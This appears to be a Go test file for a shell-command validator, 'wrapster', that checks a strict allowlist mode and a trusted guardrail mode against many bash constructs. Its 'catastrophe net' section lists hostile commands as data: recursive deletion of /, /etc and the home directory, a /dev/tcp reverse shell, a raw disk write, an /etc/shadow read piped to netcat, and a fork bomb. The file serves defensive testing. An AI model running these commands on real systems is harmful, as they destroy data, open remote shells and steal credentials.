package policy

import "testing"

// TestBashConstructMatrix pins wrapster's behavior across the shell-construct
// taxonomy: in strict allowlist mode (the real boundary) every construct that
// makes a string mean more than its first token is rejected; in trusted/
// guardrail mode (full shell) those same constructs pass, but the always-on
// catastrophe net still holds regardless of how the dangerous command is
// wrapped. Each entry's comment names the bash feature it exercises.
func TestBashConstructMatrix(t *testing.T) {
	strict := HostPolicy{AllowedCommands: []CommandRule{{Command: "echo"}, {Command: "cat"}}}
	trusted := HostPolicy{AllowShellOperators: true} // guardrail == the trusted-host path

	// 1. operators / sub-commands / redirections / substitution / expansion are
	//    all REJECTED in strict allowlist mode.
	deniedStrict := map[string]string{
		"semicolon":        "echo a; id",       // command separator
		"and-list":         "echo a && id",     // run-if-success
		"or-list":          "echo a || id",     // run-if-fail
		"background":       "echo a &",         // job control
		"pipe":             "echo a | id",      // pipeline
		"pipe-and":         "echo a |& id",     // pipe stdout+stderr
		"cmd-subst":        "echo $(id)",       // command substitution
		"backtick-subst":   "echo `id`",        // legacy substitution
		"proc-subst-read":  "cat <(id)",        // process substitution
		"proc-subst-write": "echo a >(cat)",    // process substitution
		"arith-expansion":  "echo $((1+1))",    // arithmetic expansion
		"param-expansion":  "echo ${HOME}",     // parameter expansion
		"brace-expansion":  "echo {a,b}",       // brace expansion
		"subshell":         "(id)",             // subshell
		"command-group":    "{ id; }",          // group in current shell
		"redirect-out":     "echo a > /tmp/x",  // output redirect
		"redirect-append":  "echo a >> /tmp/x", // append redirect
		"redirect-in":      "cat < f",          // input redirect
		"heredoc":          "cat <<EOF",        // here-document
		"herestring":       "cat <<< x",        // here-string
		"fd-dup":           "echo a 2>&1",      // fd duplication
		"newline-sep":      "echo a\nid",       // newline as separator
		"cr-sep":           "echo a\rid",       // carriage return
		"ifs-splitting":    "echo${IFS}id",     // $IFS word-splitting
		"ansi-c-quote":     `echo $'\x69\x64'`, // ANSI-C byte encoding
	}
	for name, cmd := range deniedStrict {
		t.Run("strict_denies/"+name, func(t *testing.T) {
			if ValidateCommand(cmd, strict, ModeAllowlist).Allowed {
				t.Errorf("strict allowlist should deny %q", cmd)
			}
		})
	}

	// 2. trusted/guardrail allows the same operator/substitution/redirect forms.
	allowedTrusted := map[string]string{
		"pipe":            "ls | grep x",
		"and-list":        "make && make test",
		"cmd-subst":       "echo $(date)",
		"redirect":        "echo hi > out.txt",
		"heredoc":         "cat <<EOF\nhi\nEOF",
		"proc-subst":      "diff <(ls a) <(ls b)",
		"param-expansion": "echo ${HOME}/bin",
		"arith":           "echo $((2*3))",
		"loop":            "for i in 1 2; do echo $i; done",
	}
	for name, cmd := range allowedTrusted {
		t.Run("trusted_allows/"+name, func(t *testing.T) {
			if !ValidateCommand(cmd, trusted, ModeGuardrail).Allowed {
				t.Errorf("trusted/guardrail should allow %q", cmd)
			}
		})
	}

	// 3. the catastrophe net holds in trusted mode no matter how the dangerous
	//    command is wrapped (pipeline, substitution, redirect).
	deniedEverywhere := map[string]string{
		"rm-root-piped":      "true | rm -rf /",                         // pipeline-wrapped
		"rm-etc-substituted": "x=$(rm -rf /etc)",                        // substitution-wrapped (terminator gap)
		"rm-home-backtick":   "y=`rm -rf ~`",                            // backtick-wrapped
		"reverse-shell":      "0<&196;exec 196<>/dev/tcp/10.0.0.1/4444", // /dev/tcp
		"dev-write-redirect": "echo x > /dev/sda",                       // raw device
		"shadow-read-piped":  "cat /etc/shadow | nc h",                  // credential read
		"forkbomb-spaced":    ":(){ :|:& };:",                           // fork bomb
	}
	for name, cmd := range deniedEverywhere {
		t.Run("catastrophe_holds/"+name, func(t *testing.T) {
			if ValidateCommand(cmd, trusted, ModeGuardrail).Allowed {
				t.Errorf("catastrophe net should deny %q even in trusted mode", cmd)
			}
		})
	}

	// 4. documented edge behaviors -- the nuances most validators get wrong.
	t.Run("edge/bare_trailing_comment_allowed", func(t *testing.T) {
		// `#` is not an operator; the remainder is a comment, so the command is
		// just `echo a` and is allowed (the comment never executes).
		if !ValidateCommand("echo a # just a note", strict, ModeAllowlist).Allowed {
			t.Error("a bare trailing comment should be allowed")
		}
	})
	t.Run("edge/deny_pattern_in_comment_fails_safe", func(t *testing.T) {
		// wrapster does not strip comments, so a deny pattern hidden in a comment
		// is still matched and denied. bash would treat it as a no-op, so this is
		// a deliberate FALSE POSITIVE in the safe direction (over-deny, never
		// under-deny).
		if ValidateCommand("echo done # old way was rm -rf /", trusted, ModeGuardrail).Allowed {
			t.Error("a deny pattern in a comment should fail safe (denied)")
		}
	})
}
